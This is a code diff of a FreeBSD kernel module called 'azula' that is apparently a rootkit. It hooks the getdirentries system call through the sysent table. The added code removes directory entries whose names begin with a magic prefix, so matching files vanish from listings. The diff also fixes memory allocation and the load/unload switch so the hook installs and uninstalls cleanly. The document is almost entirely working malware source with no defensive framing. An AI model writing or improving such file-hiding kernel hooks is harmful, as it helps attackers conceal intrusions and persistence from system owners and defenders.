@@ -1,14 +1,8 @@
 #include "azula.h"
 
-#include <sys/dirent.h>
-#include <sys/malloc.h>
-
-void *malloc(size_t size, struct	malloc_type *type, int flags);
-
-
 
 static int azula_getdirentries(struct thread *td, void *syscall_args){
-     struct getdirentries_args *uap;
+    struct getdirentries_args *uap;
     uap = (struct getdirentries_args *)syscall_args;
 
     unsigned int directory_content, count;
@@ -21,7 +15,10 @@ static int azula_getdirentries(struct thread *td, void *syscall_args){
     directory_content = td->td_retval[0];
 
     if (directory_content > 0){
-        MALLOC(dp, struct dirent*, directory_content, M_TEMP, M_NOWAIT);
+    //     // HERE"S THE ISSUE -- FUCK FREEBSD
+    //     //MALLOC(dp, struct dirent*, directory_content, M_TEMP, M_NOWAIT);
+
+        dp = malloc(directory_content, M_TEMPBUFFER, M_NOWAIT);
         // Copy the dirent struct from user buffer into kernel
         copyin(uap->buf, dp, directory_content);
 
@@ -29,24 +26,48 @@ static int azula_getdirentries(struct thread *td, void *syscall_args){
         current = dp;
         count = directory_content;
 
+        #if VERBOSE
+            uprintf("CURRENT LENGTH: %d\n", current->d_reclen);
+            uprintf("CURRENT TYPE: %d\n", current->d_type);
+            uprintf("CURRENT NAME: %s\n", current->d_name);
+            uprintf("COUNT: %d\n", count);
+        #endif
+
         // Iterate through directory entries
-        while ((current->d_reclen != 0)){
+        while ((current->d_reclen != 0) && (count > 0)){
             /* code */
             count -= current->d_reclen;
 
+            #if VERBOSE 
+                uprintf("FILE NAME: %s\n", current->d_name);
+            #endif
+
             if(memcmp((char *)&(current->d_name), MAGIC_PREFIX, 5) == 0){
-                uprintf("Same length");
+                #if VERBOSE
+                    uprintf("same length\n");
+                #endif
+
+                if (count != 0){
+                    bcopy((char *)current + current->d_reclen, current, count);
+                }
+
+                directory_content -= current->d_reclen;
+                break;
+            }
+
+            if (count != 0){
+                current = (struct dirent *)((char *)current + current->d_reclen);
             }
         }
+
 
         td->td_retval[0] = directory_content;
         copyout(dp, uap->buf, directory_content);
 
-        FREE(dp, M_TEMP);
+        free(dp, M_TEMPBUFFER);
         
     }
     return (0);
-
 }
 
 // Abandon this for now
@@ -75,11 +96,13 @@ static int load(struct module *module, int cmd, void *args){
             uprintf("Module Loaded\n");
         #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)azula_getdirentries;
+            break;
         case MOD_UNLOAD:
         #if VERBOSE
             uprintf("Module Unloaded\n");
         #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+            break;
         default:
             error = EOPNOTSUPP;
             break;
